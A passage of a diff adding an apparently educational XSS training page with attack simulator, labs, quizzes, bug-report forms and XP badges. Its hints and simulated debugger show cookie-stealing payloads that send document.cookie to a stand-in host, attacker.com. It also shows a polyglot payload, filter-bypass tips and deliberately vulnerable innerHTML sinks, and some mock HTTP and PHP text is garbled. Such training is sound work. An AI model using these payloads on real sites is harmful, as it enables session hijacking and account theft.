+      </div>
+      <div class="lb-row">
+        <div class="lb-num" style="color:var(--subtle);">🥈</div>
+        <div style="flex:1"><div style="font-weight:800;">Ahmed</div><div style="font-size:.65rem;">Expert</div></div>
+        <span class="tag cyan">850 XP</span>
+      </div>
+      <div class="lb-row">
+        <div class="lb-num" style="color:var(--muted);">🥉</div>
+        <div style="flex:1"><div style="font-weight:800;">Mohamed</div><div style="font-size:.65rem;">Researcher</div></div>
+        <span class="tag cyan">600 XP</span>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ════════════════════
+       CENTER COLUMN
+  ════════════════════ -->
+  <div class="center-col">
+
+    <!-- ATTACK SIMULATOR -->
+    <div class="card" style="padding:0;overflow:hidden;">
+      <div class="bsim-titlebar">
+        <div class="sim-dot r"></div><div class="sim-dot y"></div><div class="sim-dot g"></div>
+        <div class="bsim-tab"><i class='bx bxs-circle' style="color:var(--blue)"></i> Abdo Cyber Academy</div>
+        <div class="bsim-url">target-site.com/profile — <span style="color:var(--red);">Stored XSS Lab Active</span></div>
+      </div>
+
+      <div class="card-title" style="padding:10px 14px 0;"><i class='bx bx-terminal' style="color:var(--orange)"></i> Attack Simulator</div>
+
+      <div class="sim-tabs">
+        <button class="sim-tab-btn active" id="stab-rr" onclick="simTab('rr',this)">Request/Response</button>
+        <button class="sim-tab-btn" id="stab-dom" onclick="simTab('dom',this)">DOM Tree</button>
+        <button class="sim-tab-btn" id="stab-js" onclick="simTab('js',this)">JS Execution</button>
+      </div>
+
+      <!-- Request/Response Tab -->
+      <div id="simtab-rr" style="padding:12px;">
+        <div class="sim-body" style="padding:0;margin-bottom:10px;">
+          <div class="rr-panel">
+            <div class="rr-hdr" style="color:var(--cyan)"><i class='bx bx-upload'></i> HTTP Request</div>
+            <div class="rr-body" id="rr-req">
+              <span class="key">POST</span> <span class="val">/api/profile/update HTTP/1.1</span><br>
+              <span class="key">Host:</span> <span class="val">stor.lncttive/appas.is:95e06</span><br>
+              <span class="key">Content-Length:</span> <span class="val">10897</span><br>
+              <span class="key">Content-Type:</span> <span class="val">application/x-www-form-urlencoded</span><br>
+              <span class="key">Connect-Length:</span> <span class="val">1araha</span><br>
+              <span class="key">author:</span> <span class="val">10703</span><br><br>
+              <span class="key">name=</span><span id="rr-name-val" class="payload">1555</span><span class="key">&amp;field=</span><span class="val">Solid Posted</span>
+            </div>
+          </div>
+          <div class="rr-panel">
+            <div class="rr-hdr" style="color:var(--green)"><i class='bx bx-download'></i> HTTP Response</div>
+            <div class="rr-body" id="rr-res">
+              <span class="ok">HTTP/1.1 200 OK</span><br>
+              <span class="key">Content-Type:</span> <span class="val">text/html; charset=utf-8</span><br>
+              <span class="key">X-Frame-Options:</span> <span class="val">SAMEORIGIN</span><br><br>
+              <span class="val">&lt;div class="bio"&gt;</span><br>
+              &nbsp;&nbsp;<span id="rr-res-val" class="payload">1555</span><br>
+              <span class="val">&lt;/div&gt;</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Form Manipulator -->
+        <div style="background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:10px;">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;">
+            <div style="font-size:.72rem;font-weight:800;color:var(--orange);">🔧 Request Manipulator</div>
+            <button class="manip-btn" onclick="manipulate()">Manipulate</button>
+          </div>
+          <div class="form-fields">
+            <div class="ff-row"><span class="ff-label">Name:</span><input class="ff-input" id="ff-name" value="1555" oninput="ffUpdate()"></div>
+            <div class="ff-row"><span class="ff-label">Field:</span><input class="ff-input" id="ff-field" value="Solid Posted"></div>
+            <div class="ff-row"><span class="ff-label">Text:</span><input class="ff-input" id="ff-text" value="Bette-mentor" placeholder="insert payload..."></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- DOM Tree Tab -->
+      <div id="simtab-dom" style="padding:12px;display:none;">
+        <div class="dtj-grid">
+          <div class="dom-viewer">
+            <div class="dv-hdr" style="color:var(--green)"><i class='bx bx-code-block'></i> DOM Tree Viewer</div>
+            <div class="dv-body">
+              <div class="dom-row normal" onclick="domClick('document')"><span>📄 #document</span><span class="dom-count">root</span></div>
+              <div class="dom-row normal" onclick="domClick('html')" style="padding-right:12px;"><span>🌐 &lt;html&gt;</span></div>
+              <div class="dom-row normal" onclick="domClick('body')" style="padding-right:20px;"><span>📦 &lt;body&gt;</span></div>
+              <div class="dom-row source" onclick="domClick('div')" style="padding-right:28px;"><span>🎯 .profile-bio</span><span class="dom-count">ctace</span><span class="dom-count" style="background:rgba(249,115,22,.1);color:var(--orange);">37</span></div>
+              <div class="dom-row normal" onclick="domClick('input')" style="padding-right:36px;"><span>📝 &lt;input&gt;</span><span class="dom-count">value</span><span class="dom-count">27</span></div>
+              <div class="dom-row sink highlight" onclick="domClick('inner')" style="padding-right:44px;"><span>💉 innerHTML</span><span class="dom-count hot">38</span></div>
+              <div class="dom-row normal" onclick="domClick('status')" style="padding-right:52px;"><span>📊 status</span><span class="dom-count">0</span></div>
+            </div>
+          </div>
+          <div class="dom-viewer">
+            <div class="dv-hdr" style="color:var(--red)"><i class='bx bx-play-circle'></i> JS Runtime Debugger</div>
+            <div class="jsd-body" id="jsd-body">
+              <div class="jsd-line"><span class="jsd-num">1</span><span class="jsd-code"><span class="cmm">// Profile Bio Renderer</span></span></div>
+              <div class="jsd-line"><span class="jsd-num">2</span><span class="jsd-code"><span class="kw">const</span> bio = <span class="fn">getParam</span>(<span class="str">'bio'</span>);</span></div>
+              <div class="jsd-line"><span class="jsd-num">3</span><span class="jsd-code"><span class="kw">const</span> div = <span class="fn">document.getElementById</span>(<span class="str">'bio'</span>);</span></div>
+              <div class="jsd-line"><span class="jsd-num">4</span><span class="jsd-code"><span class="cmm">// ⚠️ VULNERABLE SINK:</span></span></div>
+              <div class="jsd-line"><span class="jsd-num">5</span><span class="jsd-code">div.<span class="exec">innerHTML</span> = bio; <span class="cmm">// ← XSS HERE</span></span></div>
+              <div class="jsd-line"><span class="jsd-num">6</span><span class="jsd-code" id="jsd-exec" style="display:none;"><span class="exec">⚡ EXECUTING: fetch('https://attacker.com?c='+document.cookie)</span></span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- JS Execution Tab -->
+      <div id="simtab-js" style="padding:12px;display:none;">
+        <div class="dom-viewer">
+          <div class="dv-hdr" style="color:var(--purple)"><i class='bx bx-history'></i> JavaScript Execution Timeline</div>
+          <div class="jsd-body">
+            <div class="jsd-line"><span class="jsd-num" style="color:var(--green);">0ms</span><span class="jsd-code"><span class="cmm">// Page load started</span></span></div>
+            <div class="jsd-line"><span class="jsd-num" style="color:var(--cyan);">12ms</span><span class="jsd-code">HTML Parser: found <span class="tg" style="color:var(--cyan);">&lt;div id="bio"&gt;</span></span></div>
+            <div class="jsd-line"><span class="jsd-num" style="color:var(--cyan);">15ms</span><span class="jsd-code">DOM Builder: created <span class="fn">HTMLDivElement</span></span></div>
+            <div class="jsd-line"><span class="jsd-num" style="color:var(--orange);">23ms</span><span class="jsd-code"><span class="kw">renderBio()</span> called → reads <span class="fn">localStorage.bio</span></span></div>
+            <div class="jsd-line"><span class="jsd-num" style="color:var(--red);">24ms</span><span class="jsd-code"><span class="exec">innerHTML = PAYLOAD → XSS triggered!</span></span></div>
+            <div class="jsd-line"><span class="jsd-num" style="color:var(--red);">24ms</span><span class="jsd-code"><span class="exec">fetch() → Cookie sent to attacker.com</span></span></div>
+            <div class="jsd-line"><span class="jsd-num" style="color:var(--muted);">25ms</span><span class="jsd-code"><span class="cmm">// Page render complete (payload executed)</span></span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Hints row -->
+      <div style="padding:0 12px 12px;">
+        <div style="display:flex;gap:6px;flex-wrap:wrap;font-size:.68rem;color:var(--muted);">
+          <span>Hints:</span>
+          <button class="mini-btn" onclick="showHint(1)">Hint 1 — 4</button>
+          <button class="mini-btn" onclick="showHint(2)">2. DOM Tree …</button>
+          <button class="mini-btn" onclick="showHint(3)">JS Moduction = 1</button>
+          <button class="mini-btn" onclick="showHint(4)">JS Execution — 4</button>
+        </div>
+        <div id="hint-show" style="margin-top:6px;display:none;background:var(--gold-d);border:1px solid rgba(234,179,8,.2);border-radius:5px;padding:7px 9px;font-size:.72rem;color:var(--subtle);"></div>
+      </div>
+    </div>
+
+    <!-- INTERACTIVE LAB + DOM + Bugs -->
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
+
+      <!-- Lab 4: Stored XSS -->
+      <div class="card" style="padding:0;overflow:hidden;">
+        <div class="lab-hdr">
+          <span>4) Interactive Lab — <span style="color:var(--orange);">Level 4: Profile Page Stored XSS</span></span>
+          <span class="tag orange">+300 XP</span>
+        </div>
+        <div style="padding:12px;">
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px;">
+            <!-- Code view -->
+            <div class="code-view">
+              <div class="cv-hdr">profile.php — vulnerable code</div>
+              <div class="cv-body">
+                <span class="cm">&lt;!DOCTYPE html&gt;</span><br>
+                <span class="tg">&lt;html <span class="at">lang</span>=<span style="color:var(--green);">"en"</span>&gt;</span><br>
+                &lt;head&gt;<br>
+                &nbsp;<span class="tg">&lt;meta <span class="at">charset</span>=<span style="color:var(--green);">"UTF-8"</span>&gt;</span><br>
+                &lt;div <span class="hl">id="bio"&gt;</span><br>
+                &nbsp;<span class="hl">// payload here</span><br>
+                &nbsp;innerHTML<span class="hl">($_POST['b'])</span>;<br>
+                &lt;else {<br>
+                &nbsp;Lvarel: <span style="color:var(--green);">"Profile Page Stored!"</span><br>
+                &lt;/body&gt;
+              </div>
+            </div>
+            <!-- Profile mockup -->
+            <div class="profile-mock">
+              <div class="profile-avatar">👤</div>
+              <div class="profile-name">Abdo Cyber Academy</div>
+              <div style="font-size:.65rem;color:var(--muted);text-align:center;margin-bottom:6px;">Found a Profile Page Stored XSS</div>
+              <div class="profile-bio-out" id="lab4-out">Bio content here...</div>
+              <input class="pay-inp" id="lab4-inp" placeholder="<script>alert(1)</script>" oninput="lab4Update()">
+              <button class="test-btn" onclick="lab4Submit()">⚡ Test Payload</button>
+            </div>
+          </div>
+          <!-- Hints -->
+          <div class="hints-panel">
+            <div class="hint-row" onclick="labHint(4,1)"><span class="hint-num">Hint: 1</span><span style="color:var(--muted);">Where is the input stored?</span></div>
+            <div class="hint-row" onclick="labHint(4,2)"><span class="hint-num">Hint 1-2</span><span style="color:var(--muted);">What happens when admin views profile?</span></div>
+            <div class="hint-row" onclick="labHint(4,3)"><span class="hint-num">Hint 1-4</span><span style="color:var(--muted);">Try &lt;img src=x onerror=alert(1)&gt;</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Bug Bounty Simulation -->
+      <div class="card" style="padding:0;overflow:hidden;">
+        <div class="lab-hdr">
+          <span>7) Bug Bounty Simulation</span>
+          <span class="tag purple">HackerOne</span>
+        </div>
+        <div style="padding:10px;">
+          <div style="font-size:.7rem;color:var(--muted);margin-bottom:8px;">Target: <strong style="color:var(--cyan);">Submit a Bug Report</strong> — fill all sections to get full score</div>
+          <div class="bb-sim-grid">
+            <div class="bb-form">
+              <div class="bb-form-title">🔍 Bug Report</div>
+              <div class="bb-field"><label>Bug Title</label><input id="bb-title" type="text" placeholder="Stored XSS in Bio..."></div>
+              <div class="bb-field"><label>Bug Report</label><textarea id="bb-report" placeholder="Go to Edit Profile → Enter payload in Bio → Save → Visit profile..." rows="3"></textarea></div>
+              <div style="font-size:.65rem;color:var(--muted);margin-bottom:4px;">Fill all the necessary Components:</div>
+              <div style="font-size:.65rem;">
+                <label style="display:flex;align-items:center;gap:4px;margin-bottom:3px;cursor:pointer;"><input type="checkbox" id="bb-c1" style="accent-color:var(--cyan)"> Necessary Components</label>
+                <label style="display:flex;align-items:center;gap:4px;cursor:pointer;"><input type="checkbox" id="bb-c2" style="accent-color:var(--cyan)"> Bug Isany Form</label>
+              </div>
+              <div class="bb-actions">
+                <button class="bb-cancel" onclick="bbReset()">Cancel</button>
+                <button class="bb-send" onclick="bbSubmit()">Send →</button>
+              </div>
+            </div>
+            <div class="feedback-panel" id="bb-feedback">
+              <div class="fb-title">📊 Report Analysis</div>
+              <div class="fb-check"><div class="fb-icon" id="fb-1">⬜</div><div style="color:var(--muted);">Title descriptive?</div></div>
+              <div class="fb-check"><div class="fb-icon" id="fb-2">⬜</div><div style="color:var(--muted);">Steps clear?</div></div>
+              <div class="fb-check"><div class="fb-icon" id="fb-3">⬜</div><div style="color:var(--muted);">Impact stated?</div></div>
+              <div class="fb-check"><div class="fb-icon" id="fb-4">⬜</div><div style="color:var(--muted);">Components filled?</div></div>
+              <div style="margin-top:8px;font-size:.68rem;color:var(--muted);" id="fb-score">Score: waiting...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ════════════════════
+       RIGHT COLUMN
+  ════════════════════ -->
+  <div class="right-col">
+
+    <!-- Hacker Progress -->
+    <div class="card">
+      <div class="card-title"><i class='bx bx-trending-up' style="color:var(--cyan)"></i> Hacker Progress</div>
+      <div style="display:flex;justify-content:space-between;font-size:.72rem;margin-bottom:4px;">
+        <span>XSS Level: <strong style="color:var(--cyan);" id="hp-rank">Beginner</strong></span>
+        <span style="color:var(--cyan);" id="hp-pct">0%</span>
+      </div>
+      <div style="font-size:.65rem;color:var(--muted);text-align:left;margin-bottom:3px;">:مستوى XSS</div>
+      <div class="hp-bar"><div class="hp-fill" id="hp-bar" style="width:0%"></div></div>
+      <div class="hp-stat-row">
+        <span>Total XP: <strong id="hp-xp">0</strong> XP</span>
+        <span style="text-align:left;">:مجموع XP</span>
+      </div>
+
+      <!-- Achievement Badges -->
+      <div style="font-size:.68rem;color:var(--muted);font-weight:700;margin-bottom:6px;">Achievement Badges:</div>
+      <div class="badges-grid">
+        <div class="badge locked" id="badge-reflected">
+          <span class="badge-icon">🔄</span>
+          <span class="badge-name">Reflected Master</span>
+        </div>
+        <div class="badge locked" id="badge-dom">
+          <span class="badge-icon">🌳</span>
+          <span class="badge-name">DOM Wizard</span>
+        </div>
+        <div class="badge locked" id="badge-filter">
+          <span class="badge-icon">🔓</span>
+          <span class="badge-name">Filter Breaker</span>
+        </div>
+        <div class="badge locked" id="badge-bypass">
+          <span class="badge-icon">🚀</span>
+          <span class="badge-name">Bypass Pro</span>
+        </div>
+        <div class="badge locked" id="badge-report">
+          <span class="badge-icon">📝</span>
+          <span class="badge-name">Reporting Pro</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Code Review Labs -->
+    <div class="card">
+      <div class="card-title"><i class='bx bx-code-curly' style="color:var(--orange)"></i> أفضل الهنتر — Code Review Labs</div>
+      <div style="font-size:.7rem;color:var(--muted);margin-bottom:8px;">Coded snippet — Identify the vulnerability:</div>
+      <div class="cr-snippet">
+        <span class="kw">let</span> name = req.query.name;<br>
+        document.<span class="vuln">innerHTML</span> = name; <span style="color:var(--muted);">// ←?</span>
+      </div>
+      <div class="cr-options" id="cr-options">
+        <div class="cr-opt" onclick="crAnswer(this,'wrong')"><div class="cr-radio"></div><span>SQL Injection</span></div>
+        <div class="cr-opt" onclick="crAnswer(this,'correct')"><div class="cr-radio"></div><span>DOM-Based XSS via innerHTML</span></div>
+        <div class="cr-opt" onclick="crAnswer(this,'wrong')"><div class="cr-radio"></div><span>CSRF Vulnerability</span></div>
+        <div class="cr-opt" onclick="crAnswer(this,'wrong')"><div class="cr-radio"></div><span>Path Traversal</span></div>
+      </div>
+      <div id="cr-result" style="display:none;font-size:.72rem;color:var(--green);background:var(--green-d);border:1px solid rgba(34,197,94,.2);border-radius:6px;padding:8px;margin-top:6px;animation:fadeIn .3s;"></div>
+
+      <!-- AI Mentor -->
+      <div class="ai-mentor" style="margin-top:10px;">
+        <div class="ai-av">🤖</div>
+        <div class="ai-text">
+          <strong>AI Mentor</strong><br>
+          <span id="ai-mentor-text">This is a textbook Source-to-Sink vulnerability. Replace innerHTML with textContent to fix it. أشوف، دي تقتص فأل الكتاب. استعمال textContent بدل innerHTML.</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Reporting Academy -->
+    <div class="card">
+      <div class="card-title"><i class='bx bx-file-blank' style="color:var(--green)"></i> 9) Reporting Academy — A template</div>
+      <div class="rep-form">
+        <div class="rep-field"><label>Title</label><input id="rep-title" placeholder="Stored XSS in User Profile Bio Field"></div>
+        <div class="rep-field"><label>Summary</label><textarea id="rep-summary" placeholder="A stored XSS vulnerability was found..." rows="2"></textarea></div>
+        <div class="rep-field"><label>Steps To Reproduce</label><textarea id="rep-steps" placeholder="1. Navigate to /profile/edit&#10;2. Insert payload in Bio field&#10;3. Save and visit profile..." rows="3"></textarea></div>
+        <div class="rep-checks">
+          <label class="rep-check"><input type="checkbox" id="rc-1"> Fill all the necessary Components</label>
+          <label class="rep-check"><input type="checkbox" id="rc-2"> Necessary Components verified</label>
+          <label class="rep-check"><input type="checkbox" id="rc-3"> Bug Isany Form complete</label>
+        </div>
+        <div class="rep-btns">
+          <button class="rep-cancel" onclick="repReset()">Cancel</button>
+          <button class="rep-send" onclick="repSend()">Send Report →</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+</div><!-- /main-grid -->
+
+<!-- OVERLAYS -->
+<div class="ach-popup" id="ach-popup"><span id="ach-icon">🏅</span><span id="ach-text">Achievement!</span></div>
+<div class="xp-notif" id="xp-notif">+0 XP</div>
+<div class="toast" id="toast">✅ Done</div>
+
+<script>
+// ══════════════════════════════════
+// STATE
+// ══════════════════════════════════
+let XP = 0;
+const solved = {lab4: false, bb: false, cr: false, rep: false};
+const badges = {reflected:false,dom:false,filter:false,bypass:false,report:false};
+const RANKS = [{min:0,l:'🟢 Beginner'},{min:200,l:'🏹 Hunter'},{min:500,l:'🧠 Researcher'},{min:800,l:'👑 Expert'},{min:1000,l:'⚡ Elite'}];
+
+function getRank(){for(let i=RANKS.length-1;i>=0;i--)if(XP>=RANKS[i].min)return RANKS[i].l;return RANKS[0].l}
+function addXP(n,msg){
+  XP+=n;
+  const r=getRank();const p=Math.min((XP/1000)*100,100);
+  document.getElementById('nav-xp').textContent=XP+' XP';
+  document.getElementById('nav-rank').textContent=r;
+  document.getElementById('hp-xp').textContent=XP;
+  document.getElementById('hp-rank').textContent=r.replace(/^\S+\s/,'');
+  document.getElementById('hp-pct').textContent=Math.round(p)+'%';
+  document.getElementById('hp-bar').style.width=p+'%';
+  document.getElementById('lb-xp-me').textContent=XP+' XP';
+  const xn=document.getElementById('xp-notif');
+  xn.textContent='+'+n+' XP — '+msg;xn.style.display='block';
+  setTimeout(()=>xn.style.display='none',2200);
+  checkBadges();
+}
+function showToast(m){const t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(()=>t.style.display='none',2300)}
+function showAch(icon,text){
+  const p=document.getElementById('ach-popup');
+  document.getElementById('ach-icon').textContent=icon;
+  document.getElementById('ach-text').textContent=text;
+  p.style.display='flex';setTimeout(()=>p.style.display='none',2800);
+}
+
+// ══════════════════════════════════
+// KNOWLEDGE MAP
+// ══════════════════════════════════
+const KM={
+  root:{t:'XSS — Cross-Site Scripting',b:'ثغرة تسمح بحقن JavaScript في صفحات ويب يراها مستخدمون آخرون. تنقسم إلى 3 أنواع: Reflected, Stored, DOM.'},
+  reflected:{t:'Reflected XSS',b:'المدخل يُعكس فوراً في الـ response. يحتاج الضحية لضغط على رابط مُعدّ. أسرع في الاكتشاف لكن يحتاج Social Engineering.'},
+  getpost:{t:'GET/POST Parameters',b:'ابحث في الـ query string (?q=) والـ form POST body. أي parameter يظهر في الـ response = هدف محتمل.'},
+  filter:{t:'Output Filters',b:'كثير من التطبيقات تُفلتر <script> فقط. جرّب event handlers (onerror, onload) أو SVG أو مواقع أخرى في الـ DOM.'},
+  flutter:{t:'Flutter XSS',b:'تقنية تستغل كيفية معالجة Flutter WebView للمحتوى. مفيد في تطبيقات الـ mobile التي تستخدم web views.'},
+  polyglot:{t:'Polyglot Payloads',b:'Payload واحد يعمل في سياقات متعددة: HTML Body, Attribute, JS String. مثال: jaVaScript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1))'},
+  mutation:{t:'Mutation XSS (mXSS)',b:'المتصفح يُعيد تحليل HTML بعد الـ sanitizer مما يُنشئ payload جديد. يعمل ضد DOMPurify في إصدارات معينة.'},
+  clientfilter:{t:'Client-Side Filters',b:'JavaScript filters يمكن تجاوزها بالتلاعب في الـ prototype، أو تعديل الـ request مباشرة في Burp.'},
+  bypass:{t:'Advanced Bypass Techniques',b:'مجموعة تقنيات لتجاوز WAFs والـ Filters: Encoding (HTML/URL/Unicode), Double Encoding, Case Variation, Comment Injection.'},
+  stored:{t:'Stored XSS',b:'الـ payload يُخزَّن في DB ويُعرض لكل زائر. أخطر أنواع XSS — لا يحتاج تفاعلاً من الضحية. الهدف: Admin Panels.'},
+  database:{t:'Database Storage',b:'Payload يُخزَّن في جدول Users, Posts, Comments إلخ. يُسترجع لاحقاً ويُعرض بدون encoding لكل من يرى الصفحة.'},
+  adminview:{t:'Admin View Target',b:'الهدف المثالي: تخزين payload في محتوى يراه Admin. ينتج: Full Account Takeover + Privilege Escalation.'},
+  clientside2:{t:'Client-Side Filters (Stored)',b:'حتى لو فلترت الإدخال — الإخراج يجب أن يكون مُشفَّراً. الـ filter على الإدخال وحده لا يكفي.'},
+  dom:{t:'DOM-Based XSS',b:'الثغرة في JavaScript client-side. Source (location.hash) → Sink (innerHTML). لا يمر بالسيرفر — يصعب اكتشافه بـ scanners.'},
+  javascript:{t:'JavaScript Engine',b:'V8 يُنفّذ أي JS بصلاحيات الـ origin. وصول كامل لـ cookies, localStorage, requests.'},
+  sourcesink:{t:'Source → Sink Flow',b:'Source: location.hash, document.URL, postMessage. Sink: innerHTML, eval(), document.write(), setTimeout(string).'}
+};
+function kmClick(k){
+  const d=document.getElementById('km-detail');
+  const data=KM[k];if(!data)return;
+  d.innerHTML=`<strong style="color:var(--cyan);font-size:.78rem;">${data.t}</strong><br><span style="font-size:.72rem;color:var(--subtle);">${data.b}</span>`;
+  d.style.display='block';
+}
+
+// ══════════════════════════════════
+// CVE
+// ══════════════════════════════════
+const CVES={
+  '2023-1':{id:'CVE-2023-XXXX',desc:'Reflected XSS in Search — App rendered ?q= parameter directly via innerHTML. Payload: <img src=x onerror=alert(document.cookie)>. Impact: Session Hijacking. Fix: htmlspecialchars() on output.',bounty:'$1,500'},
+  '2023-2':{id:'CVE-2023-XXXX',desc:'Stored XSS in Comments — Bio field stored raw HTML. Admin opens users list → payload executes → Admin session stolen. Fix: DOMPurify + CSP.',bounty:'$4,200'},
+  '2023-3':{id:'CVE-2023-XXXX',desc:'DOM XSS via postMessage — iframe sends data without origin check. Parent renders with innerHTML. Fix: Validate origin + use textContent.',bounty:'$2,800'},
+  '2023-4':{id:'CVE-2023-XXXX',desc:'mXSS via DOMPurify bypass — Foreign namespace element parsing caused sanitized HTML to be re-parsed maliciously by browser.',bounty:'$6,500'},
+  '2023-5':{id:'CVE-2023-XXXX',desc:'XSS + CSRF Chain — Reflected XSS in API endpoint bypassed CSRF token check because SOP was already violated. Full account control.',bounty:'$3,900'}
+};
+function showCVE(k){
+  const c=CVES[k];
+  document.getElementById('ai-mentor-text').textContent=`${c.id}: ${c.desc} → Bounty paid: ${c.bounty}`;
+}
+
+// ══════════════════════════════════
+// SIM TABS
+// ══════════════════════════════════
+function simTab(id,btn){
+  ['rr','dom','js'].forEach(t=>{
+    document.getElementById('simtab-'+t).style.display='none';
+    document.getElementById('stab-'+t).classList.remove('active');
+  });
+  document.getElementById('simtab-'+id).style.display='block';
+  btn.classList.add('active');
+}
+
+// ══════════════════════════════════
+// REQUEST MANIPULATOR
+// ══════════════════════════════════
+function ffUpdate(){
+  const n=document.getElementById('ff-name').value;
+  document.getElementById('rr-name-val').textContent=n;
+  document.getElementById('rr-res-val').textContent=n;
+}
+function manipulate(){
+  const n=document.getElementById('ff-name').value;
+  const t=document.getElementById('ff-text').value;
+  document.getElementById('rr-name-val').textContent=n;
+  document.getElementById('rr-res-val').innerHTML=t;
+  if(t.includes('fetch(')||t.includes('alert(')||t.includes('onerror')){
+    document.getElementById('jsd-exec').style.display='flex';
+    showToast('⚡ Payload reflected in Response — DOM execution triggered!');
+    addXP(50,'Request Manipulated');
+  }
+}
+
+// ══════════════════════════════════
+// DOM NODES
+// ══════════════════════════════════
+const DOM_NODES={
+  document:'#document — root of DOM tree. All elements are children.',
+  html:'<html> — document element. Contains head and body.',
+  body:'<body> — rendered page content. All visible elements live here.',
+  div:'div.profile-bio — contains user-controlled bio content → rendered via innerHTML',
+  input:'<input> — form field. value attribute reflected in DOM.',
+  inner:'innerHTML SINK ⚠️ — sets raw HTML. XSS payload executes here when user visits profile!',
+  status:'status: 0 — page load indicator. Not a security concern here.'
+};
+function domClick(id){
+  const t=document.getElementById('ai-mentor-text');
+  t.textContent=DOM_NODES[id]||'Select a node to inspect...';
+}
+
+// ══════════════════════════════════
+// HINTS
+// ══════════════════════════════════
+const HINTS=[null,
+  'الثغرة في Profile Bio field — تُخزَّن في DB وتُعرض لكل زائر بدون encoding.',
+  'ابنِ DOM Tree المتوقع في ذهنك — أين يظهر المدخل في الـ HTML؟',
+  'JS Execution: الـ Code يفعل bio.innerHTML = userInput — هذا هو الـ sink.',
+  'الـ Payload المثالي: <script>fetch("https://attacker.com?c="+document.cookie)</script>'
+];
+function showHint(n){
+  const el=document.getElementById('hint-show');
+  el.style.display='block';el.textContent='💡 Hint '+n+': '+HINTS[n];
+}
+function labHint(lab,n){showHint(n);}
+
+// ══════════════════════════════════
+// LAB 4
+// ══════════════════════════════════
+function lab4Update(){
+  const v=document.getElementById('lab4-inp').value;
+  document.getElementById('lab4-out').innerHTML=v||'Bio content here...';
+}
+function lab4Submit(){
+  const v=document.getElementById('lab4-inp').value;
+  document.getElementById('lab4-out').innerHTML=v;
+  if(!solved.lab4&&(v.includes('script')||v.includes('onerror')||v.includes('onload')||v.includes('alert')||v.includes('fetch'))){
+    solved.lab4=true;
+    addXP(300,'Level 4 Stored XSS Solved!');
+    showAch('🌳','DOM Wizard Badge Unlocked!');
+    unlockBadge('dom');unlockBadge('reflected');
+  }
+}
+
+// ══════════════════════════════════
+// BUG BOUNTY SIM
+// ══════════════════════════════════
+function bbSubmit(){
+  const title=document.getElementById('bb-title').value.trim();
+  const report=document.getElementById('bb-report').value.trim();
+  const c1=document.getElementById('bb-c1').checked;
+  const c2=document.getElementById('bb-c2').checked;
+  const checks=[title.length>10,report.length>30,c1,c2];
+  const icons=['fb-1','fb-2','fb-3','fb-4'];
+  checks.forEach((ok,i)=>document.getElementById(icons[i]).textContent=ok?'✅':'❌');
+  const score=Math.round(checks.filter(Boolean).length/4*100);
+  document.getElementById('fb-score').innerHTML=`<strong style="color:${score>=75?'var(--green)':score>=50?'var(--gold)':'var(--red)'}">${score}% Report Quality</strong>`;
+  if(score>=75&&!solved.bb){
+    solved.bb=true;addXP(200,'Bug Report Submitted!');
+    unlockBadge('report');showAch('📝','Reporting Pro Badge!');
+  }
+}
+function bbReset(){
+  ['bb-title','bb-report'].forEach(i=>document.getElementById(i).value='');
+  ['bb-c1','bb-c2'].forEach(i=>document.getElementById(i).checked=false);
+  ['fb-1','fb-2','fb-3','fb-4'].forEach(i=>document.getElementById(i).textContent='⬜');
+  document.getElementById('fb-score').textContent='Score: waiting...';
+}
+
+// ══════════════════════════════════
+// CODE REVIEW
+// ══════════════════════════════════
+function crAnswer(el,type){
+  if(document.getElementById('cr-result').style.display==='block')return;
+  el.classList.add(type);
+  el.querySelector('.cr-radio').style.background=type==='correct'?'var(--green)':'var(--red)';
+  const res=document.getElementById('cr-result');
+  res.style.display='block';
+  if(type==='correct'){
+    res.textContent='✅ صحيح! هذا DOM-Based XSS — document.innerHTML يُنفّذ أي HTML. الإصلاح: استخدم textContent بدلاً من innerHTML.';
+    if(!solved.cr){solved.cr=true;addXP(50,'Code Review Correct!');}
+    document.getElementById('ai-mentor-text').textContent='ممتاز! الإجابة الصحيحة: innerHTML يُشغّل HTML Parser على المدخل. بديله الآمن textContent يُعامله كنص عادي فقط.';
+  } else {
+    res.style.color='var(--red)';res.style.background='var(--red-d)';res.style.borderColor='rgba(239,68,68,.2)';
+    res.textContent='❌ خطأ — راجع الكود مرة أخرى. السؤال: ما الـ function الخطيرة في السطر الثاني؟';
+  }
+}
+
+// ══════════════════════════════════
+// REPORTING ACADEMY
+// ══════════════════════════════════
+function repSend(){
+  const title=document.getElementById('rep-title').value.trim();
+  const summary=document.getElementById('rep-summary').value.trim();
+  const steps=document.getElementById('rep-steps').value.trim();
+  if(title&&summary&&steps){
+    if(!solved.rep){solved.rep=true;addXP(200,'Report Academy Complete!');unlockBadge('report');showAch('📝','Reporting Pro!');}
+    showToast('✅ تقرير احترافي مكتمل — جاهز للإرسال لـ HackerOne!');
+  } else showToast('⚠️ أكمل جميع حقول التقرير أولاً');
+}
+function repReset(){['rep-title','rep-summary','rep-steps'].forEach(i=>document.getElementById(i).value='');['rc-1','rc-2','rc-3'].forEach(i=>document.getElementById(i).checked=false);}
+
+// ══════════════════════════════════
+// BADGES
+// ══════════════════════════════════
+function unlockBadge(id){
+  if(badges[id])return;badges[id]=true;
+  const el=document.getElementById('badge-'+id);
+  if(el){el.classList.remove('locked');el.classList.add('earned');}
+  checkBadges();
+}
+function checkBadges(){
+  if(XP>=100&&!badges.reflected)unlockBadge('reflected');
+  if(solved.lab4&&!badges.dom)unlockBadge('dom');
+  if(XP>=400&&!badges.filter)unlockBadge('filter');
+  if(XP>=600&&!badges.bypass)unlockBadge('bypass');
+  if((solved.rep||solved.bb)&&!badges.report)unlockBadge('report');
+}
+
+// ══════════════════════════════════
+// FORUM / JOB CLICKS
